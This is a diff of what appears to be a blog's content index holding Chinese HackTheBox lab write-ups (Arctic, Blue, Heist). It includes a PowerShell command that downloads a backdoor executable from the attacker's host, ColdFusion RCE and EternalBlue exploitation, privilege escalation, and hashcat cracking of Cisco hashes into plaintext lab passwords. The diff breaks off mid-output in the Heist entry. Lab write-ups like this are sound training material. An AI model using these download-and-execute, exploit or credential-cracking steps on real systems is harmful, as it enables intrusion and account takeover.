@@ -80,8 +80,8 @@
 <img src="/DevSecOps/tools/fortifyssc/DraggedImage-10.png" class="" title="webapps">
 <p>进入<code>Apache Software Foundation\\Tomcat 9.0\\bin</code>, 点开tomcat9w –&gt; Java –&gt; Java options 添加<code>-Dfortify.home=E:\SSC\fortify </code>  –&gt; 修改内存(初始化4G，最大推荐16以上) –&gt; 应用, 然后启动Tomcat</p>
 <img src="/DevSecOps/tools/fortifyssc/DraggedImage-11.png" class="">
-<style>.ropnoyxcbhvc{zoom:150%;}</style><img src="/DevSecOps/tools/fortifyssc/DraggedImage-12.png" class="ropnoyxcbhvc" alt="修改配置">
-<style>.cbsouvvrtfxm{zoom:150%;}</style><img src="/DevSecOps/tools/fortifyssc/DraggedImage-13.png" class="cbsouvvrtfxm">
+<style>.bjrxlqqnidqh{zoom:150%;}</style><img src="/DevSecOps/tools/fortifyssc/DraggedImage-12.png" class="bjrxlqqnidqh" alt="修改配置">
+<style>.orsbucrdtgyt{zoom:150%;}</style><img src="/DevSecOps/tools/fortifyssc/DraggedImage-13.png" class="orsbucrdtgyt">
 
 <h4 id="安装SSC"><a href="#安装SSC" class="headerlink" title="安装SSC"></a>安装SSC</h4><p> 打开浏览器访问 <a href="http://127.0.0.1:8080/ssc/">http://127.0.0.1:8080/ssc/</a></p>
 <img src="/DevSecOps/tools/fortifyssc/DraggedImage-14.png" class="" title="访问SSC">
@@ -116,82 +116,9 @@
       </tags>
   </entry>
   <entry>
-    <title>HTB-Arctic</title>
-    <url>/Hackthebox/htb/htb-arctic/</url>
-    <content><![CDATA[<style>.oicsskymetnf{zoom:50%;}</style><img src="/Hackthebox/htb/htb-arctic/0d6275efbd5e48fcdc96e61b9724ae5e.png" class="oicsskymetnf">
-
-<span id="more"></span>
-
-<table>
-<thead>
-<tr>
-<th>OS</th>
-<th>Difficulty</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Windows</td>
-<td>Easy</td>
-</tr>
-</tbody></table>
-<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-arctic/image-20250202222155508.png" class="" title="Nmap">
-
-<p>访问10.10.10.11:8500，发现一个目录列表，找到一个后台页面 <code>/CFIDE/administrator</code> 可以看到版本是8</p>
-<img src="/Hackthebox/htb/htb-arctic/image-20250203110808681.png" class="" title="目录列表">
-
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用searchsploit检索coldfusion 8 找到一个RCE，复制exp到当前目录</p>
-<img src="/Hackthebox/htb/htb-arctic/image-20250203111301420.png" class="" title="searchsploit">
-
-<img src="/Hackthebox/htb/htb-arctic/image-20250203111746331.png" class="" title="复制文件到当前目录">
-
-<p>修改exp里面的IP地址，然后执行脚本，成功获取到shell</p>
-<img src="/Hackthebox/htb/htb-arctic/image-20250203111813277.png" class="" title="GetShell">
-
-<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>查看一下系统信息，Windows Server 2008 R2 x64 </p>
-<img src="/Hackthebox/htb/htb-arctic/image-20250203112144909.png" class="" title="信息收集">
-
-<p>使用msf生成一个后门，利用获取到的shell 下载并执行</p>
-<p><code>powershell &quot;(new-object System.Net.WebClient).Downloadfile(&#39;http://10.10.16.10:8000/shell.exe&#39;,&#39;shell.exe&#39;)&quot;</code></p>
-<p>msfconsole获取shell成功</p>
-<img src="/Hackthebox/htb/htb-arctic/image-20250203114209620.png" class="" title="GetShell">
-
-<p>使用msf的ms10-092 脚本进行提权，提示报错需要x64 的meterpreter</p>
-<img src="/Hackthebox/htb/htb-arctic/image-20250203132850659.png" class="" title="报错">
-
-<p>查找x64 的进程进行迁移</p>
-<img src="/Hackthebox/htb/htb-arctic/image-20250203132941496.png" class="" title="查看进程">
-
-<p>迁移成功，重新执行提权脚本，成功提权</p>
-<img src="/Hackthebox/htb/htb-arctic/image-20250203133216230.png" class="" title="迁移进程">
-
-<table>
-<thead>
-<tr>
-<th>Flag</th>
-<th>Path</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Flag1</td>
-<td>C:\Users\tolis\Desktop\user.txt</td>
-</tr>
-<tr>
-<td>Flag2</td>
-<td>C:\Users\Administrator\Desktop\root.txt</td>
-</tr>
-</tbody></table>
-]]></content>
-      <categories>
-        <category>Hackthebox</category>
-      </categories>
-      <tags>
-        <tag>RCE</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>HTB-Bastard</title>
     <url>/Hackthebox/htb/htb-bastard/</url>
-    <content><![CDATA[<style>.zxwubqbzupdp{zoom:50%;}</style><img src="/Hackthebox/htb/htb-bastard/a8d2ae87fbe6d1ccfe93522d74defb3a.png" class="zxwubqbzupdp">
+    <content><![CDATA[<style>.wbmvblubclyn{zoom:50%;}</style><img src="/Hackthebox/htb/htb-bastard/a8d2ae87fbe6d1ccfe93522d74defb3a.png" class="wbmvblubclyn">
 
 <span id="more"></span>
 
@@ -266,7 +193,7 @@
   <entry>
     <title>HTB-Beep</title>
     <url>/Hackthebox/htb/htb-beep/</url>
-    <content><![CDATA[<style>.ermcubmccjwh{zoom:50%;}</style><img src="/Hackthebox/htb/htb-beep/995f465295b99869fce21ecadea4604c.png" class="ermcubmccjwh">
+    <content><![CDATA[<style>.oxvboqqeyluz{zoom:50%;}</style><img src="/Hackthebox/htb/htb-beep/995f465295b99869fce21ecadea4604c.png" class="oxvboqqeyluz">
 
 <span id="more"></span>
 
@@ -335,9 +262,82 @@
       </tags>
   </entry>
   <entry>
+    <title>HTB-Arctic</title>
+    <url>/Hackthebox/htb/htb-arctic/</url>
+    <content><![CDATA[<style>.kwjugnmjulwo{zoom:50%;}</style><img src="/Hackthebox/htb/htb-arctic/0d6275efbd5e48fcdc96e61b9724ae5e.png" class="kwjugnmjulwo">
+
+<span id="more"></span>
+
+<table>
+<thead>
+<tr>
+<th>OS</th>
+<th>Difficulty</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Windows</td>
+<td>Easy</td>
+</tr>
+</tbody></table>
+<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-arctic/image-20250202222155508.png" class="" title="Nmap">
+
+<p>访问10.10.10.11:8500，发现一个目录列表，找到一个后台页面 <code>/CFIDE/administrator</code> 可以看到版本是8</p>
+<img src="/Hackthebox/htb/htb-arctic/image-20250203110808681.png" class="" title="目录列表">
+
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用searchsploit检索coldfusion 8 找到一个RCE，复制exp到当前目录</p>
+<img src="/Hackthebox/htb/htb-arctic/image-20250203111301420.png" class="" title="searchsploit">
+
+<img src="/Hackthebox/htb/htb-arctic/image-20250203111746331.png" class="" title="复制文件到当前目录">
+
+<p>修改exp里面的IP地址，然后执行脚本，成功获取到shell</p>
+<img src="/Hackthebox/htb/htb-arctic/image-20250203111813277.png" class="" title="GetShell">
+
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>查看一下系统信息，Windows Server 2008 R2 x64 </p>
+<img src="/Hackthebox/htb/htb-arctic/image-20250203112144909.png" class="" title="信息收集">
+
+<p>使用msf生成一个后门，利用获取到的shell 下载并执行</p>
+<p><code>powershell &quot;(new-object System.Net.WebClient).Downloadfile(&#39;http://10.10.16.10:8000/shell.exe&#39;,&#39;shell.exe&#39;)&quot;</code></p>
+<p>msfconsole获取shell成功</p>
+<img src="/Hackthebox/htb/htb-arctic/image-20250203114209620.png" class="" title="GetShell">
+
+<p>使用msf的ms10-092 脚本进行提权，提示报错需要x64 的meterpreter</p>
+<img src="/Hackthebox/htb/htb-arctic/image-20250203132850659.png" class="" title="报错">
+
+<p>查找x64 的进程进行迁移</p>
+<img src="/Hackthebox/htb/htb-arctic/image-20250203132941496.png" class="" title="查看进程">
+
+<p>迁移成功，重新执行提权脚本，成功提权</p>
+<img src="/Hackthebox/htb/htb-arctic/image-20250203133216230.png" class="" title="迁移进程">
+
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Path</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Flag1</td>
+<td>C:\Users\tolis\Desktop\user.txt</td>
+</tr>
+<tr>
+<td>Flag2</td>
+<td>C:\Users\Administrator\Desktop\root.txt</td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>Hackthebox</category>
+      </categories>
+      <tags>
+        <tag>RCE</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HTB-Blocky</title>
     <url>/Hackthebox/htb/htb-blocky/</url>
-    <content><![CDATA[<style>.gtmetrvwdcdx{zoom:50%;}</style><img src="/Hackthebox/htb/htb-blocky/f412784c311bdf52c3655381d2c9cd21.png" class="gtmetrvwdcdx">
+    <content><![CDATA[<style>.pklpfecrdglv{zoom:50%;}</style><img src="/Hackthebox/htb/htb-blocky/f412784c311bdf52c3655381d2c9cd21.png" class="pklpfecrdglv">
 
 <span id="more"></span>
 
@@ -482,59 +482,9 @@ root@Blocky:~<span class="token comment"># id</span>
       </tags>
   </entry>
   <entry>
-    <title>HTB-Blue</title>
-    <url>/Hackthebox/htb/htb-blue/</url>
-    <content><![CDATA[<style>.zbkleyfyuhwi{zoom:50%;}</style><img src="/Hackthebox/htb/htb-blue/52e077ae40899ab8b024afd51cb29b1c.png" class="zbkleyfyuhwi">
-
-<span id="more"></span>
-
-<table>
-<thead>
-<tr>
-<th align="left">OS</th>
-<th align="left">Difficulty</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Windows</td>
-<td align="left">Easy</td>
-</tr>
-</tbody></table>
-<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-blue/image-20250216114713990.png" class="" title="Nmap">
-
-<p>一个开放了445端口的Win7，直接尝试使用ms17-010 攻击目标</p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>直接使用msfconsole <code>exploit/windows/smb/ms17_010_eternalblue</code> 模块进行攻击</p>
-<img src="/Hackthebox/htb/htb-blue/image-20250216120342061.png" class="" title="永恒之蓝">
-
-<table>
-<thead>
-<tr>
-<th align="left">Flag</th>
-<th align="left">Path</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Flag1</td>
-<td align="left">C:\Users\haris\Desktop\user.txt</td>
-</tr>
-<tr>
-<td align="left">Flag2</td>
-<td align="left">C:\Users\Administrator\Desktop\root.txt</td>
-</tr>
-</tbody></table>
-]]></content>
-      <categories>
-        <category>Hackthebox</category>
-      </categories>
-      <tags>
-        <tag>CVE</tag>
-        <tag>永恒之蓝</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>HTB-BountyHunter</title>
     <url>/Hackthebox/htb/htb-bountyhunter/</url>
-    <content><![CDATA[<style>.urxkjacjmyha{zoom:50%;}</style><img src="/Hackthebox/htb/htb-bountyhunter/a24c032885e56a17a6c74cc58b63e8f4.png" class="urxkjacjmyha">
+    <content><![CDATA[<style>.ejehlbtndtuh{zoom:50%;}</style><img src="/Hackthebox/htb/htb-bountyhunter/a24c032885e56a17a6c74cc58b63e8f4.png" class="ejehlbtndtuh">
 
 <span id="more"></span>
 
@@ -721,9 +671,59 @@ __Ticket Code:__
       </tags>
   </entry>
   <entry>
+    <title>HTB-Blue</title>
+    <url>/Hackthebox/htb/htb-blue/</url>
+    <content><![CDATA[<style>.gtcdrqtgiuge{zoom:50%;}</style><img src="/Hackthebox/htb/htb-blue/52e077ae40899ab8b024afd51cb29b1c.png" class="gtcdrqtgiuge">
+
+<span id="more"></span>
+
+<table>
+<thead>
+<tr>
+<th align="left">OS</th>
+<th align="left">Difficulty</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Windows</td>
+<td align="left">Easy</td>
+</tr>
+</tbody></table>
+<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-blue/image-20250216114713990.png" class="" title="Nmap">
+
+<p>一个开放了445端口的Win7，直接尝试使用ms17-010 攻击目标</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>直接使用msfconsole <code>exploit/windows/smb/ms17_010_eternalblue</code> 模块进行攻击</p>
+<img src="/Hackthebox/htb/htb-blue/image-20250216120342061.png" class="" title="永恒之蓝">
+
+<table>
+<thead>
+<tr>
+<th align="left">Flag</th>
+<th align="left">Path</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Flag1</td>
+<td align="left">C:\Users\haris\Desktop\user.txt</td>
+</tr>
+<tr>
+<td align="left">Flag2</td>
+<td align="left">C:\Users\Administrator\Desktop\root.txt</td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>Hackthebox</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+        <tag>永恒之蓝</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HTB-Devel</title>
     <url>/Hackthebox/htb/htb-devel/</url>
-    <content><![CDATA[<style>.kmjzkmtdcihv{zoom:50%;}</style><img src="/Hackthebox/htb/htb-devel/0fb6455a29eb4f2682f04a780ce26cb1.png" class="kmjzkmtdcihv">
+    <content><![CDATA[<style>.yylnbmorutqq{zoom:50%;}</style><img src="/Hackthebox/htb/htb-devel/0fb6455a29eb4f2682f04a780ce26cb1.png" class="yylnbmorutqq">
 
 <span id="more"></span>
 
@@ -742,7 +742,7 @@ __Ticket Code:__
 <h3 id="Nmap-scan"><a href="#Nmap-scan" class="headerlink" title="Nmap scan"></a>Nmap scan</h3><img src="/Hackthebox/htb/htb-devel/image-20250201213314487.png" class="" title="Nmap">
 
 <p>发现两个开放端口 21和80，FTP允许匿名登录，先登录FTP看看，FTP的目录底下是主站点的文件</p>
-<style>.fssakxwqoytj{zoom:150%;}</style><img src="/Hackthebox/htb/htb-devel/image-20250201213757511.png" class="fssakxwqoytj" alt="登录FTP">
+<style>.xhgzlcsxukft{zoom:150%;}</style><img src="/Hackthebox/htb/htb-devel/image-20250201213757511.png" class="xhgzlcsxukft" alt="登录FTP">
 
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>生成一个webshell然后通过ftp上传</p>
 <img src="/Hackthebox/htb/htb-devel/image-20250201215256322.png" class="" title="生成webshell">
@@ -784,7 +784,7 @@ __Ticket Code:__
   <entry>
     <title>HTB-DevOops</title>
     <url>/Hackthebox/htb/htb-devoops/</url>
-    <content><![CDATA[<style>.vujfhiqjlhkt{zoom:50%;}</style><img src="/Hackthebox/htb/htb-devoops/c74d84352f781ad5c7a4c35c0c3aa0ac.png" class="vujfhiqjlhkt">
+    <content><![CDATA[<style>.ynbctofijgaz{zoom:50%;}</style><img src="/Hackthebox/htb/htb-devoops/c74d84352f781ad5c7a4c35c0c3aa0ac.png" class="ynbctofijgaz">
 
 <span id="more"></span>
 
@@ -1013,7 +1013,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Grandpa</title>
     <url>/Hackthebox/htb/htb-grandpa/</url>
-    <content><![CDATA[<style>.eshfmoeturqm{zoom:50%;}</style><img src="/Hackthebox/htb/htb-grandpa/381683fd107da11f1dc916401ae8aee0.png" class="eshfmoeturqm">
+    <content><![CDATA[<style>.kvrnejurdppu{zoom:50%;}</style><img src="/Hackthebox/htb/htb-grandpa/381683fd107da11f1dc916401ae8aee0.png" class="kvrnejurdppu">
 
 <span id="more"></span>
 
@@ -1073,7 +1073,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Granny</title>
     <url>/Hackthebox/htb/htb-granny/</url>
-    <content><![CDATA[<style>.buxykvbgqiui{zoom:50%;}</style><img src="/Hackthebox/htb/htb-granny/e8a122e2d713a4fb4a180bb9ccd20248.png" class="buxykvbgqiui">
+    <content><![CDATA[<style>.fdqndbilpntv{zoom:50%;}</style><img src="/Hackthebox/htb/htb-granny/e8a122e2d713a4fb4a180bb9ccd20248.png" class="fdqndbilpntv">
 
 <span id="more"></span>
 
@@ -1130,9 +1130,305 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
       </tags>
   </entry>
   <entry>
+    <title>HTB-Heist</title>
+    <url>/Hackthebox/htb/htb-heist/</url>
+    <content><![CDATA[<style>.qptidzahqksu{zoom:50%;}</style><img src="/Hackthebox/htb/htb-heist/131dbaba68b169bd5ff59ac09420b09f.png" class="qptidzahqksu">
+
+<span id="more"></span>
+
+<table>
+<thead>
+<tr>
+<th>OS</th>
+<th>Difficulty</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Windows</td>
+<td>Easy</td>
+</tr>
+</tbody></table>
+<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap <span class="token number">10.10</span>.10.149 <span class="token parameter variable">-sC</span> <span class="token parameter variable">-sV</span> -p- <span class="token parameter variable">-T4</span> --min-rate <span class="token number">1000</span>                 
+Starting Nmap <span class="token number">7.95</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-03-22 <span class="token number">12</span>:02 CST
+Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.10.149
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.11s latency<span class="token punctuation">)</span>.
+Not shown: <span class="token number">65530</span> filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>
+PORT      STATE SERVICE       VERSION
+<span class="token number">80</span>/tcp    <span class="token function">open</span>  http          Microsoft IIS httpd <span class="token number">10.0</span>
+<span class="token operator">|</span> http-methods: 
+<span class="token operator">|</span>_  Potentially risky methods: TRACE
+<span class="token operator">|</span> http-title: Support Login Page
+<span class="token operator">|</span>_Requested resource was login.php
+<span class="token operator">|</span>_http-server-header: Microsoft-IIS/10.0
+<span class="token operator">|</span> http-cookie-flags: 
+<span class="token operator">|</span>   /: 
+<span class="token operator">|</span>     PHPSESSID: 
+<span class="token operator">|</span>_      httponly flag not <span class="token builtin class-name">set</span>
+<span class="token number">135</span>/tcp   <span class="token function">open</span>  msrpc         Microsoft Windows RPC
+<span class="token number">445</span>/tcp   <span class="token function">open</span>  microsoft-ds?
+<span class="token number">5985</span>/tcp  <span class="token function">open</span>  http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
+<span class="token operator">|</span>_http-title: Not Found
+<span class="token operator">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+<span class="token number">49669</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows<span class="token punctuation">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+<span class="token operator">|</span> smb2-time: 
+<span class="token operator">|</span>   date: <span class="token number">2025</span>-03-22T03:46:41
+<span class="token operator">|</span>_  start_date: N/A
+<span class="token operator">|</span> smb2-security-mode: 
+<span class="token operator">|</span>   <span class="token number">3</span>:1:1: 
+<span class="token operator">|</span>_    Message signing enabled but not required
+<span class="token operator">|</span>_clock-skew: <span class="token parameter variable">-18m26s</span>
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
+Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">217.07</span> seconds
+</code></pre>
+
+<p>添加本地域名解析</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">'10.10.10.149  heist.htb'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts </code></pre>
+
+<p>访问80 端口，点击guest登录</p>
+<img src="/Hackthebox/htb/htb-heist/image-20250322122035954.png" class="" title="登录">
+
+<p>点击Attachment，跳转到<code>http://heist.htb/attachments/config.txt</code></p>
+<img src="/Hackthebox/htb/htb-heist/image-20250322121508924.png" class="" title="config.txt">
+
+<p>可以获取到用户名和密码hash</p>
+<pre class="language-txt" data-language="txt"><code class="language-txt">version 12.2
+no service pad
+service password-encryption
+!
+isdn switch-type basic-5ess
+!
+hostname ios-1
+!
+security passwords min-length 12
+enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
+!
+username rout3r password 7 0242114B0E143F015F5D1E161713
+username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
+!
+!
+ip ssh authentication-retries 5
+ip ssh version 2
+!
+!
+router bgp 100
+ synchronization
+ bgp log-neighbor-changes
+ bgp dampening
+ network 192.168.0.0Â mask 300.255.255.0
+ timers bgp 3 9
+ redistribute connected
+!
+ip classless
+ip route 0.0.0.0 0.0.0.0 192.168.0.1
+!
+!
+access-list 101 permit ip any any
+dialer-list 1 protocol ip list 101
+!
+no ip http server
+no ip http secure-server
+!
+line vty 0 4
+ session-timeout 600
+ authorization exec SSH
+ transport input ssh
+</code></pre>
+
+<h3 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h3><p>破解password7 <code>https://www.firewall.cx/cisco/cisco-routers/cisco-type7-password-crack.html</code></p>
+<p>使用hashid 识别hash 类型然后使用hashcat 破解</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ hashid <span class="token string">'$1$pdQG$o8nrSzsGXeaduXrjlvKc91'</span>
+Analyzing <span class="token string">'$1$pdQG$o8nrSzsGXeaduXrjlvKc91'</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> MD5 Crypt 
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Cisco-IOS<span class="token punctuation">(</span>MD5<span class="token punctuation">)</span> 
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> FreeBSD MD5 </code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ hashcat <span class="token parameter variable">-a</span> <span class="token number">0</span> <span class="token parameter variable">-m</span> <span class="token number">500</span>  <span class="token builtin class-name">hash</span> /usr/share/wordlists/rockyou.txt 
+hashcat <span class="token punctuation">(</span>v6.2.6<span class="token punctuation">)</span> starting
+<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>
+<span class="token variable">$1</span><span class="token variable">$pdQG</span><span class="token variable">$o8nrSzsGXeaduXrjlvKc91</span>:stealth1agent              
+                                                          
+Session<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: hashcat
+Status<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: Cracked
+Hash.Mode<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">500</span> <span class="token punctuation">(</span>md5crypt, MD5 <span class="token punctuation">(</span>Unix<span class="token punctuation">)</span>, Cisco-IOS <span class="token variable">$1</span>$ <span class="token punctuation">(</span>MD5<span class="token punctuation">))</span>
+Hash.Target<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token variable">$1</span><span class="token variable">$pdQG</span><span class="token variable">$o8nrSzsGXeaduXrjlvKc91</span>
+Time.Started<span class="token punctuation">..</span><span class="token punctuation">..</span>.: Sat Mar <span class="token number">22</span> <span class="token number">12</span>:30:30 <span class="token number">2025</span> <span class="token punctuation">(</span><span class="token number">13</span> secs<span class="token punctuation">)</span>
+Time.Estimated<span class="token punctuation">..</span>.: Sat Mar <span class="token number">22</span> <span class="token number">12</span>:30:43 <span class="token number">2025</span> <span class="token punctuation">(</span><span class="token number">0</span> secs<span class="token punctuation">)</span>
+Kernel.Feature<span class="token punctuation">..</span>.: Pure Kernel
+Guess.Base<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: File <span class="token punctuation">(</span>/usr/share/wordlists/rockyou.txt<span class="token punctuation">)</span>
+Guess.Queue<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">1</span>/1 <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span>
+Speed.<span class="token comment">#1.........:   267.4 kH/s (7.34ms) @ Accel:128 Loops:125 Thr:32 Vec:1</span>
+Recovered<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">1</span>/1 <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span> Digests <span class="token punctuation">(</span>total<span class="token punctuation">)</span>, <span class="token number">1</span>/1 <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span> Digests <span class="token punctuation">(</span>new<span class="token punctuation">)</span>
+Progress<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: <span class="token number">3563520</span>/14344385 <span class="token punctuation">(</span><span class="token number">24.84</span>%<span class="token punctuation">)</span>
+Rejected<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: <span class="token number">0</span>/3563520 <span class="token punctuation">(</span><span class="token number">0.00</span>%<span class="token punctuation">)</span>
+Restore.Point<span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">3538944</span>/14344385 <span class="token punctuation">(</span><span class="token number">24.67</span>%<span class="token punctuation">)</span>
+Restore.Sub.<span class="token comment">#1...: Salt:0 Amplifier:0-1 Iteration:875-1000</span>
+Candidate.Engine.: Device Generator
+Candidates.<span class="token comment">#1....: stefy06 -> ssrssr1978</span>
+Hardware.Mon.<span class="token comment">#1..: Temp: 49c Util: 65% Core:1771MHz Mem:3504MHz Bus:8</span>
+
+Started: Sat Mar <span class="token number">22</span> <span class="token number">12</span>:30:29 <span class="token number">2025</span>
+Stopped: Sat Mar <span class="token number">22</span> <span class="token number">12</span>:30:45 <span class="token number">2025</span>
+                                                                     </code></pre>
+
+<pre class="language-none"><code class="language-none">rout3r: 0242114B0E143F015F5D1E161713($uperP@ssword)
+admin: 02375012182C1A1D751618034F36415408(Q4)sJu\Y8qz*A3?d)
+hazard：$1$pdQG$o8nrSzsGXeaduXrjlvKc91(stealth1agent)</code></pre>
+
+<h3 id="枚举用户"><a href="#枚举用户" class="headerlink" title="枚举用户"></a>枚举用户</h3><p>使用netexec 和凭证枚举用户</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ netexec smb heist.htb  <span class="token parameter variable">-u</span> <span class="token string">"hazard"</span> <span class="token parameter variable">-p</span> <span class="token string">"stealth1agent"</span> --rid-brute 
+SMB         <span class="token number">10.10</span>.10.149    <span class="token number">445</span>    SUPPORTDESK      <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Windows <span class="token number">10</span> / Server <span class="token number">2019</span> Build <span class="token number">17763</span> x64 <span class="token punctuation">(</span>name:SUPPORTDESK<span class="token punctuation">)</span> <span class="token punctuation">(</span>domain:SupportDesk<span class="token punctuation">)</span> <span class="token punctuation">(</span>signing:False<span class="token punctuation">)</span> <span class="token punctuation">(</span>SMBv1:False<span class="token punctuation">)</span>
+SMB         <span class="token number">10.10</span>.10.149    <span class="token number">445</span>    SUPPORTDESK      <span class="token punctuation">[</span>+<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>hazard:stealth1agent 
+SMB         <span class="token number">10.10</span>.10.149    <span class="token number">445</span>    SUPPORTDESK      <span class="token number">500</span>: SUPPORTDESK<span class="token punctuation">\</span>Administrator <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
+SMB         <span class="token number">10.10</span>.10.149    <span class="token number">445</span>    SUPPORTDESK      <span class="token number">501</span>: SUPPORTDESK<span class="token punctuation">\</span>Guest <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
+SMB         <span class="token number">10.10</span>.10.149    <span class="token number">445</span>    SUPPORTDESK      <span class="token number">503</span>: SUPPORTDESK<span class="token punctuation">\</span>DefaultAccount <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
+SMB         <span class="token number">10.10</span>.10.149    <span class="token number">445</span>    SUPPORTDESK      <span class="token number">504</span>: SUPPORTDESK<span class="token punctuation">\</span>WDAGUtilityAccount <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
+SMB         <span class="token number">10.10</span>.10.149    <span class="token number">445</span>    SUPPORTDESK      <span class="token number">513</span>: SUPPORTDESK<span class="token punctuation">\</span>None <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
+SMB         <span class="token number">10.10</span>.10.149    <span class="token number">445</span>    SUPPORTDESK      <span class="token number">1008</span>: SUPPORTDESK<span class="token punctuation">\</span>Hazard <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
+SMB         <span class="token number">10.10</span>.10.149    <span class="token number">445</span>    SUPPORTDESK      <span class="token number">1009</span>: SUPPORTDESK<span class="token punctuation">\</span>support <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
